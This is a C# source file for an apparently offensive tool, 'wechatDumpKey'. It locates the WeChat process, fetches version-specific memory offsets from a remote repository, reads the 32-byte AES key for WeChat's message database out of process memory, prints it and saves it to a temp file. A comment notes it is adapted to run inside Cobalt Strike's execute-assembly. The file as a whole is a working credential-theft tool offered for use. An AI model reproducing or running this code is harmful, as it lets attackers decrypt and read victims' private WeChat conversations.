using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Web.Script.Serialization;

namespace wechatDumpKey
{
    class Program
    {
        //inner enum used only internally
        [Flags]
        private enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            Thread = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x0000001F,
            NoHeaps = 0x40000000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId
        );
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        //static extern IntPtr CreateToolhelp32Snapshot([In] UInt32 dwFlags, [In] UInt32 th32ProcessID);
        static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, IntPtr th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool Module32NextW(IntPtr hSnapshot, ref MODULEENTRY32 lpme);


        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        public struct MODULEENTRY32
        {
            internal uint dwSize;
            internal uint th32ModuleID;
            internal uint th32ProcessID;
            internal uint GlblcntUsage;
            internal uint ProccntUsage;
            internal IntPtr modBaseAddr;
            internal uint modBaseSize;
            internal IntPtr hModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            internal string szModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            internal string szExePath;
        }
        // get the parent process given a pid





        private class Studet
        {
           public List<Lis> tables { get; set; }
        }
        private class Lis
        {
            public string ver { get; set; }
            public string addr { get; set; }
        }
        
            public static IntPtr GetBaseAddr(IntPtr wdBaseAddr, String ver)
        {

            IntPtr basePtr = IntPtr.Zero;
            IntPtr padding = IntPtr.Zero;
            try
            {
                WebClient httpClient = new WebClient();
                httpClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36");
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                //https://stackoverflow.com/questions/32994464/could-not-create-ssl-tls-secure-channel-despite-setting-servercertificatevalida
                Stream Httpdata = httpClient.OpenRead("https://jihulab.com/bluesky1/padding/-/raw/main/README.md");

                StreamReader reader = new StreamReader(Httpdata);
                string jsonString = reader.ReadToEnd();
                Httpdata.Close();
                reader.Close();


                /*
                JObject m = JsonConvert.DeserializeObject<JObject>(s);

                String raw = m[ver].ToString();

                */


                JavaScriptSerializer jss = new JavaScriptSerializer();
                Studet student = jss.Deserialize<Studet>(jsonString);

                foreach (Lis table in student.tables){
                    if (table.ver.Equals(ver))
                    {
                        padding = new IntPtr(Convert.ToInt32(table.addr, 16));
                        break;
                    }
                }
                //padding = new IntPtr(Convert.ToInt32(raw, 16));
            }

            catch (WebException E)
            {
                Console.WriteLine("[-] " + E.Message);
                Environment.Exit(0);
            }
            catch(NullReferenceException)
            {
                Console.WriteLine("[-] This Version Not Support.");
                Environment.Exit(0);

            }


            if (padding != IntPtr.Zero)
            {
                // basePtr = IntPtr.Add(wdBaseAddr, padding.ToInt32()); # .Net 4.0
                basePtr = new IntPtr(wdBaseAddr.ToInt32() + padding.ToInt32());
            }
            else
            {
                Console.WriteLine("[-] This Version Not Support.");
                Environment.Exit(0);
            }

            return basePtr;
            
        }
        public static void DumpKey(int pid, MODULEENTRY32 ModEntry, String ver, IntPtr wdBaseAddr)
        {
            IntPtr KeyBase = GetBaseAddr(wdBaseAddr, ver);

            IntPtr procHandle = OpenProcess(0x001F0FFF, false, pid);


                if (procHandle == IntPtr.Zero)
            {
                var eCode = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Error code:" + eCode);
            }
            else
            {
                Console.WriteLine("[+] Open Process Success");
                byte[] buffer = new byte[4];
                int bytesread = 0;
                ReadProcessMemory(procHandle, KeyBase, buffer, buffer.Length, ref bytesread);
                if (Marshal.GetLastWin32Error() == 0 || Marshal.GetLastWin32Error() == 1008)
                {
                    Array.Reverse(buffer);
                    IntPtr Pointer = new IntPtr(Convert.ToInt32(BitConverter.ToString(buffer).Replace("-", ""), 16));
                    Console.WriteLine("[*] Found Key Address:" + Pointer);
                    byte[] keyBuf = new byte[32];
                    ReadProcessMemory(procHandle, Pointer, keyBuf, 32, ref bytesread);
                    Console.WriteLine("[+] Dump AES Key Success:" + BitConverter.ToString(keyBuf).Replace("-", ""));

                    try
                    {
                        String outPutName = @"C:\Windows\Temp\DBPass.Bin";
                        String buf = "0x" + BitConverter.ToString(keyBuf).Replace("-", ",0x");
                            //StreamWriter sr = new StreamWriter(outPutName, false, Encoding.Unicode);
                        StreamWriter sr = new StreamWriter(outPutName, false);
                        sr.Write(buf);
                        sr.Flush();
                        sr.Close();

                        Console.WriteLine("[*] Save To File " + outPutName);
                    }
                    catch (IOException e)
                    {
                        Console.WriteLine("[-] " + e.Message + "\n Cannot create DBPass.Bin file.");
                    }
                }
                else
                {
                    Console.WriteLine("[-] Error code:" + Marshal.GetLastWin32Error());
                    Environment.Exit(0);
                }
                CloseHandle(procHandle);

                /*
                Array.Reverse(buffer);
                Console.WriteLine("[*] dumping key...");
                byte[] aesKey = new byte[32];
                String pointer = "0x";
                for(int i=0;i < buffer.Length; i++)
                {
                    pointer = pointer + buffer[i];
                }
                Console.WriteLine("[*] Pointer:" + pointer);
                */
                // ReadProcessMemory(procHandle, (IntPtr)potiner, aesKey, aesKey.Length,ref bytesread);

            }
        }
        public static void OpenWechatProc(int pid)
        {
            IntPtr handleToSnapshot = IntPtr.Zero;
            try
            {
                MODULEENTRY32 ModEntry = new MODULEENTRY32()
                {
                    dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32))
                };
                // handleToSnapshot = CreateToolhelp32Snapshot((uint)SnapshotFlags.All, (uint)pid); #This can't Run in the CobalStrike execute-assembly 
                handleToSnapshot = CreateToolhelp32Snapshot(SnapshotFlags.Module | SnapshotFlags.Module32, (IntPtr)pid);
                if (Module32First(handleToSnapshot, ref ModEntry))
                {

                    List<string> Modules = new List<string>();
                    do
                    {
                        //Modules.Add(ModEntry.hModule.ToString());
                        //Console.WriteLine(ModEntry.szModule + "----Module");
                        if (ModEntry.szModule.Equals("WeChatWin.dll"))
                        {
                            String ver = FileVersionInfo.GetVersionInfo(ModEntry.szExePath).FileVersion;
                            IntPtr wdBaseAddr = ModEntry.modBaseAddr;
                            Console.WriteLine("[*] WeChatWin Version:" + ver);
                            DumpKey(pid, ModEntry, ver, wdBaseAddr);

                        }
                    } while (Module32NextW(handleToSnapshot, ref ModEntry));
                    {
                      //  Console.WriteLine("[*] Config Directory:" + GetWeChatDbFolder());
                    }
                }
                /*
                else
                {
                    Console.WriteLine("[-] Error Code:" + Marshal.GetLastWin32Error());
                }
                */
            }
            catch (Exception ex)
            {
                throw new ApplicationException("[-] Can't get the process.", ex);
            }
            finally
            {
                // Must clean up the snapshot object!
                CloseHandle(handleToSnapshot);
            }

        }


        static void Main(String[] args)
        {
            try
            {
                String banner = @"
_____________________                    
\______   \__    ___/___ _____    _____  
 |    |  _/ |    |_/ __ \\__  \  /     \ 
 |    |   \ |    |\  ___/ / __ \|  Y Y  \
 |______  / |____| \___  >____  /__|_|  /
        \/             \/     \/      \/ 
";
                Console.WriteLine(banner);
                Process proc = Process.GetProcessesByName("wechat")[0];
                Console.WriteLine("[*] Found Wechat Process Pid:" + proc.Id);
                OpenWechatProc(proc.Id);
                proc.Close();
                Console.WriteLine("[+] Done.");

            }
            catch (IndexOutOfRangeException)
            {
                Console.WriteLine("[-] Wechat Process Not Found.");
            }
            catch (Exception err)
            {
                Console.WriteLine(err);
            }
        }

        /*
        [DllImport("kernel32.dll")]
        private static extern UIntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(UIntPtr hObject);

        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        static void Main(string[] args)
        {
            uint PID = 11008;
            UIntPtr handle = UIntPtr.Zero;
            handle = OpenProcess(PROCESS_QUERY_INFORMATION, false, PID);
            Console.WriteLine(handle);
            if (!handle.Equals(UIntPtr.Zero))
            {
                CloseHandle(handle);
            }
            Console.ReadKey();

        }


                    * ReadProcessMemory
                    //1.进程句柄，由OpenProcess函数获取；
                    //2.要读出数据的地址；
                    //3用于存放读取数据的地址；
                    //4读出的数据大小；
                    //5读出数据的实际大小;
        */
    }
}
